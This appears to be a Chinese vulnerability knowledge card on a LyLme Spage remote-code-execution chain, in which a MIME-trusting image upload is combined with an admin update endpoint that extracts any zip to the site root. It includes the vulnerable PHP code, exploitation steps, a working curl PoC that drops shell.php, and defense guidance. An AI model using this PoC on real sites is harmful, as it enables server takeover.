---
id: web-generic-file-upload-lylme-update-zip-extract-rce
title: LyLme Spage MIME 信任上传 + 后台更新 copy/zipExtract：任意压缩包解压到站点根 getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: mime-trust-upload-update-zip-extract
aliases:
- LyLme Spage getshell
- 六零导航页 RCE
- ajax_link.php 更新解压
- lylme_spage-update.zip
- 上传图片马 zip 解压根目录
tags:
- web
- php
- file-upload
- mime
- zip
- rce
- code-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V516
  verified_at: '2026-11-11T11:53:14+08:00'
  notes: 已对照原文与图06-09：图06 shell.zip 内含 shell.php；图07 include/file.php 返回 {"code":"200","msg":"上传成功","url":"http://localhost/files/upload/20240228044208307.jpg"}；图08 HackBar POST /admin/ajax_link.php?submit=update，body file=../files/upload/20240228044208307.jpg，响应 success；图09 访问 /shell.php 显示 PHP 7.3.4 phpinfo，RCE 打通。卡片上传点（信任 $_FILES['file']['type'] 固定图片后缀、move_uploaded_file 到 files/upload）、更新点（copy($_POST['file'])→lylme_spage-update.zip→zipExtract(...,ROOT)）与原文代码一致，PoC 的 URL/路径/参数与截图逐字吻合；对后台鉴权原文未展示，卡片已注明需管理员会话的前提，未夸大。dedup：recommendation=new；content-type-trust-bypass 仅覆盖第一段 MIME 信任（可保留 .php 原后缀），thinkphp-admin-upload-unzip 为不同产品/入口，本卡真正 sink 是后台更新 copy+zipExtract 解压根目录，链条不同；dup-scan.json 未涉及。与其余三卡（XSS/SSRF）无重叠、各自原子。去留：保留并 verified。
---

## 一句话结论

LyLme Spage 的上传点 `include/file.php` 只根据 `$_FILES['file']['type']` 决定保存后缀（`image/jpeg`→`.jpg`），不校验内容，任意 zip 改 MIME 即可落成 `.jpg`；后台 `admin/ajax_link.php?submit=update` 又把 `$_POST['file']` 直接 `copy()` 成 `lylme_spage-update.zip` 并 `zipExtract($ZipFile, ROOT)` 解压到站点根目录，包内 `shell.php` 随之落地执行，形成「上传压缩包 → 更新接口解压 → getshell」链。

## 原理

- 上传点（`include/file.php`）：
  ```php
  $type = $upfile["type"];              // 客户端 multipart Content-Type
  switch ($type) {
      case 'image/jpeg': $extend = ".jpg"; break;
      case 'image/gif':  $extend = ".gif"; break;
      case 'image/png':  $extend = ".png"; break;
      case 'image/x-icon': $extend = ".ico"; break;
  }
  $img_name = IMG_NAME . $extend;
  move_uploaded_file($tmp_name, $dir . $img_name);
  ```
  `$upfile['type']` 来自请求 part 的 `Content-Type`，完全由客户端控制；服务端不检查文件头/内容，只按声明类型给一个图片后缀。把内含 `shell.php` 的 zip 声明为 `image/jpeg` 上传，落盘为 `<IMG_NAME>.jpg`，响应返回可访问 URL（如 `/files/upload/20240228044208307.jpg`）。
- 更新点（`admin/ajax_link.php`）：
  ```php
  $RemoteFile = $_POST['file'];
  $ZipFile = "lylme_spage-update.zip";
  copy($RemoteFile, $ZipFile) or die("无从更新服务器下载更新包文件！");
  if (zipExtract($ZipFile, ROOT)) {
      ...
      unlink($ZipFile);
      exit('success');
  }
  ```
  `$_POST['file']` 未做路径/来源校验，`copy()` 可复制任意可读路径（原文用 `../files/upload/<上传的 .jpg>` 相对路径）；`zipExtract($ZipFile, ROOT)` 把压缩包内容解压到站点根目录 `ROOT`，包内的 `shell.php` 直接落 Web 根。
- 为什么成立：上传点给了攻击者一个「任意内容 + 可预测路径」的落文件能力，更新点把「服务器上的任意文件」当可信更新包解压到根目录；两个功能都假设输入可信，组合起来即任意文件写入 → RCE。
- 原文验证：zip 内放 `shell.php`，改名/声明为 jpg 上传，拿到 `/files/upload/20240228044208307.jpg`；请求 `POST /admin/ajax_link.php?submit=update` 带 `file=../files/upload/20240228044208307.jpg` 返回 `success`；访问 `/shell.php` 执行 `phpinfo()`。

## 触发条件

- 目标运行含该代码的 LyLme Spage 版本（原文未标注具体版本）。
- `/include/file.php` 上传接口可访问（原文直接 POST 成功，未讨论鉴权）。
- `admin/ajax_link.php?submit=update` 可访问；原文请求截图中未显示登录态/Cookie 细节，若目标校验后台会话则需先取得管理员权限。
- 站点根目录可写（`ROOT`），PHP 能解析解压出的脚本。

## 利用步骤

1. 制作 `shell.zip`，根目录放 `shell.php`（原文用 `<?php phpinfo(); ?>` 验证）。
2. 把 zip 改名为 `shell.jpg`（或任意名），multipart 的 `Content-Type` 设为 `image/jpeg`。
3. POST 到 `/include/file.php`，响应返回上传后的 URL（如 `/files/upload/20240228044208307.jpg`）。
4. POST 到 `/admin/ajax_link.php?submit=update`，body 的 `file` 填相对路径 `../files/upload/20240228044208307.jpg`。
5. 接口返回 `success` 后访问 `/shell.php`，确认代码执行。

## PoC

```bash
# shell.zip 内含 shell.php: <?php phpinfo(); ?>
curl -s -X POST 'http://target/include/file.php' \
  -F 'file=@shell.zip;filename=shell.jpg;type=image/jpeg'
# 返回 {"code":"200","msg":"上传成功","url":"http://target/files/upload/20240228044208307.jpg"}

curl -s -X POST 'http://target/admin/ajax_link.php?submit=update' \
  --data 'file=../files/upload/20240228044208307.jpg'
# 返回 success

curl -s 'http://target/shell.php'
```

## 变体与关联

- 变体：上传点只限制后缀为图片，zip 可加入任意 php/htaccess/模板文件；解压到 ROOT 可直接覆盖现有文件（配置、入口）。
- 变体：更新接口的 `copy()` 源路径不受限，若能从业内已知路径（上传目录、临时目录、日志）找到合法 zip，也可跨目录投递；`file` 参数本身还可能有目录穿越/任意文件复制副作用。
- 关联：[[web-generic-file-upload-content-type-trust-bypass]]——第一段「只信 multipart Content-Type」的通用手法；本卡增加了后台更新解压的第二段 sink。
- 关联：[[web-generic-file-upload-thinkphp-admin-upload-unzip-webshell]]——同类「ZIP 上传 + Update/unzip 任意解压」链，另一套代码。
- 关联：[[web-generic-file-upload-mcms-uploadtemplate-zip-magic-header-jsp]]——上传模板 zip 解压落地的变体。

## 检测与防御

- 防御：上传接口按文件头（magic bytes）/内容判定类型，而不是 `$_FILES['type']`；即使限定图片，也应重新编码图片并保存到不可执行目录、随机文件名。
- 防御：更新接口禁止 `$_POST['file']` 任意路径，更新包必须从官方源下载并校验签名/哈希；解压前校验 zip 条目（禁止路径穿越、脚本文件），解压到隔离目录后再按白名单搬移。
- 防御：Web 根目录禁止解压写入；更新功能加管理员二次确认与操作审计。
- 检测：上传目录出现 `.jpg` 但内容为 ZIP（`PK\x03\x04`）、随后 `/admin/ajax_link.php?submit=update` 带 `../` 路径、根目录新增 PHP 文件并立即被访问。
- 检测：审计 `copy($_POST[...])` 与 `zipExtract(..., ROOT)` 组合的更新代码模式。
